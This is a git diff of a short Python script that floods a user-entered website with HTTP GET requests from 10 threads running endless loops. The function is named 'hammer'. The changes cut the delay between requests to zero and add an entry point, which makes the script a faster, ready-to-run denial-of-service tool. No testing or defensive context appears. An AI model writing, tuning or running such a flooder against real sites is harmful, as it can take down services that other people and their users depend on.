@@ -2,15 +2,15 @@ import requests
 import time
 import threading
 
-URL = "http://" + input("type web url \n example: example.com")
+URL = "http://" + input("type web url \nexample: example.com \n")
 THREADS = 10
-DELAY = 0.1
+DELAY = 0
 
 def hammer():
     while True:
         try:
             response = requests.get(URL)
-            print(f"[{response.status_code}] {response.text[:50]}")
+            print(f"[{response.status_code}]")
         except Exception as e:
             print(f"[!] Error: {e}")
         time.sleep(DELAY)
@@ -21,3 +21,6 @@ def main():
         t.daemon = True
         t.start()
     input("Press Enter to stop...\n")
+
+if __name__ == "__main__":
+    main()
